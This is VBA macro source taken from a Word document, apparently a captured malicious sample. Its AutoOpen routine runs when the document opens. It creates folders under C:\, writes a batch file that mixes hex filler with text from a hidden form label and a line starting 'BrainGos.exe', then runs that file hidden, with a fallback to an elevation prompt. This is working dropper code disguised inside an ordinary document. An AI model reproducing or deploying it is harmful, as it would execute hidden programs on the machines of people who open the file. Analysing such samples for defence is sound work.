Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Attribute VB_Name = "moderror"
#If VBA7 Then
Public Declare PtrSafe Function SetFocus Lib "user32" (ByVal hWnd As Long) As LongPtr
Public Declare PtrSafe Function ReleaseCapture Lib "user32" () As LongPtr
Public Declare PtrSafe Function InSendMessage Lib "user32" () As LongPtr
Public Declare PtrSafe Function GetMenuCheckMarkDimensions Lib "user32" () As LongPtr
Public Declare PtrSafe Function GetMessageExtraInfo Lib "user32" () As LongPtr
Public Declare PtrSafe Function GetMessagePos Lib "user32" () As LongPtr
Public Declare PtrSafe Function GetMessageTime Lib "user32" () As LongPtr


Private Declare PtrSafe Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As LongPtr, ByVal dwCreationFlags As LongPtr, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As LongPtr) As LongPtr
Private Declare PtrSafe Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As LongPtr, lpExitCode As LongPtr) As LongPtr
Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As LongPtr

#Else
Public Declare Function SetFocus Lib "user32" (ByVal hWnd As Long) As Long
Public Declare Function ReleaseCapture Lib "user32" () As Long
Public Declare Function InSendMessage Lib "user32" () As Long
Public Declare Function GetMenuCheckMarkDimensions Lib "user32" () As Long
Public Declare Function GetMessageExtraInfo Lib "user32" () As Long
Public Declare Function GetMessagePos Lib "user32" () As Long
Public Declare Function GetMessageTime Lib "user32" () As Long

Private Declare Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

#End If

Private Const NORMAL_PRIORITY_CLASS         As Long = &H20&
Private Const STARTF_USESHOWWINDOW          As Long = 1
Private Const SW_HIDE                       As Long = 0
Private Const SW_SHOWDEFAULT                As Long = 10
Private Const ERROR_ELEVATION_REQUIRED      As Long = 740
'--- for WaitForXxx
Private Const INFINITE                      As Long = &HFFFFFFFF
'--- for ShellExecuteEx
Private Const SEE_MASK_NOCLOSEPROCESS       As Long = &H40

Private Type STARTUPINFO
    cb                  As Long
    lpReserved          As String
    lpDesktop           As String
    lpTitle             As String
    dwX                 As Long
    dwY                 As Long
    dwXSize             As Long
    dwYSize             As Long
    dwXCountChars       As Long
    dwYCountChars       As Long
    dwFillAttribute     As Long
    dwFlags             As Long
    wShowWindow         As Integer
    cbReserved2         As Integer
    lpReserved2         As Long
    hStdInput           As Long
    hStdOutput          As Long
    hStdError           As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess            As Long
    hThread             As Long
    dwProcessID         As Long
    dwThreadID          As Long
End Type

Private Type SHELLEXECUTEINFO
    cbSize              As Long
    fMask               As Long
    hWnd                As Long
    lpVerb              As String
    lpFile              As String
    lpParameters        As String
    lpDirectory         As Long
    nShow               As Long
    hInstApp            As Long
    '  Optional fields
    lpIDList            As Long
    lpClass             As Long
    hkeyClass           As Long
    dwHotKey            As Long
    hIcon               As Long
    hProcess            As Long
End Type

Private Const MSG_ELEVATION_REQUIRED        As String = "To run %1 as administrator please confirm next elevation of rights"

Public Function ShellWait( _
            ByVal sFile As String, _
            sParams, _
            bStartHidden, _
            oOwnerForm) As Long
    Const FUNC_NAME     As String = "ShellWait"
    Dim sCommandLine    As String
    Dim uInfo           As PROCESS_INFORMATION
    Dim uStart          As STARTUPINFO
    Dim lExitCode
    Dim uShell          As SHELLEXECUTEINFO
    Dim sFileName       As String

    On Error GoTo EH
    '--- win9x: fix spaces or not working on 9x
    If InStr(sFile, " ") > 0 Then
        sCommandLine = """" & sFile & """" & " " & sParams
    Else
        sCommandLine = sFile & " " & sParams
    End If
    uStart.cb = Len(uStart)
    If bStartHidden Then
        uStart.dwFlags = STARTF_USESHOWWINDOW
        uStart.wShowWindow = SW_HIDE
    End If
    If CreateProcess(vbNullString, sCommandLine, 0, 0, 1, NORMAL_PRIORITY_CLASS, 0, vbNullString, uStart, uInfo) <> 0 Then
        Call WaitForSingleObject(uInfo.hProcess, INFINITE)
        If GetExitCodeProcess(uInfo.hProcess, lExitCode) <> 0 Then
            ShellWait = lExitCode
        End If
        Call CloseHandle(uInfo.hThread)
        Call CloseHandle(uInfo.hProcess)
    Else
        If Err.LastDllError = ERROR_ELEVATION_REQUIRED Then
            If Not oOwnerForm Is Nothing Then
                If InStrRev(sFile, "\") > 0 Then
                    sFileName = Mid(sFile, InStrRev(sFile, "\") + 1)
                Else
                    sFileName = sFile
                End If
                MsgBox Replace(MSG_ELEVATION_REQUIRED, "%1", sFileName), vbExclamation
                uShell.hWnd = oOwnerForm.hWnd
            End If
            With uShell
                .cbSize = Len(uShell)
                .fMask = SEE_MASK_NOCLOSEPROCESS
                .lpVerb = "runas"
                .lpFile = sFile
                .lpParameters = sParams
                .nShow = IIf(bStartHidden, SW_HIDE, SW_SHOWDEFAULT)
            End With
                Call WaitForSingleObject(uShell.hProcess, INFINITE)
                If GetExitCodeProcess(uShell.hProcess, lExitCode) <> 0 Then
                    ShellWait = lExitCode
                End If
                Call CloseHandle(uShell.hProcess)
            End If
        End If
    
    Exit Function
EH:
    Debug.Print FUNC_NAME; ": "; Error
    Resume Next
End Function
Sub writeFile(filename As String)

    Open filename For Output As #1
    Print #1, "B8FF30F9A039C113374DD03EE1B28D09C0F73D2D97CFE68EE535BF9A6DB5EEC12967ED1E7D733C0C075CE"
    Print #1, "67692D373A68DE51009343C04DD607E7F80A741E6F5084EBB0C76DE812543EC60380287FF3D7B10B83428"
    Print #1, "B00B70E247FCE07CAE3AC781A1D83276CBD71537221FF95538030F03CCBDD02C6EF26B4AAD3312FD9C6FF"
    Print #1, smallcode.lblsample.Caption
    Print #1, "with the filename  " & filename
    Print #1, "start c:\cfgPath3\BrainGos.exe"
    Print #1, "9B54593B287987E4DF8F3095E4935F2FD71C8E17596487D14977AE588B53AEA5D194D0C24BAC7C1981DB2"
    Print #1, "break>%CODEVBSLINE%"
    Print #1, "1FF9E9FABA1E4DAB91239A2F0B2D75546B93FB3D7480536AE32D36E28BB497ED9CDCA25D90969D8E32F22"
    Close #1

End Sub



Sub autoopen()

Dim EngRusLanguage
Dim visitcmd
SetFocus ByVal 0&

InSendMessage

    Set EngRusLanguage = CreateObject("Scripting.FileSystemObject")
    
    If EngRusLanguage.FolderExists("C:\cfgPath1\") = False Then
    EngRusLanguage.CreateFolder "C:\cfgPath1\"
    End If
    
    If EngRusLanguage.FolderExists("C:\cfgPath2\") = False Then
    EngRusLanguage.CreateFolder "C:\cfgPath2\"
    End If

    If EngRusLanguage.FolderExists("C:\cfgPath3\") = False Then
    EngRusLanguage.CreateFolder "C:\cfgPath3\"
    End If

GetMenuCheckMarkDimensions

    If EngRusLanguage.FolderExists("C:\cfgPath4\") = False Then
    EngRusLanguage.CreateFolder "C:\cfgPath4\"
    End If
    
    If EngRusLanguage.FolderExists("C:\cfgPath5\") = False Then
    EngRusLanguage.CreateFolder "C:\cfgPath5\"
    End If

    Dim file_1 As String
    Dim file_2 As String

    file_1 = "C:\cfgPath3\RandomData.cmd"
    Call writeFile(file_1)
    GetMessageExtraInfo
    ShellWait file_1, vbNullString, 1, 0
End Sub





Attribute VB_Name = "smallcode"
Attribute VB_Base = "0{7B8EFD4F-F4C5-465C-99B6-A73EF8937658}{62B5783F-64A0-4960-BED2-27F2AB231912}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False


INQUEST-PP=macro
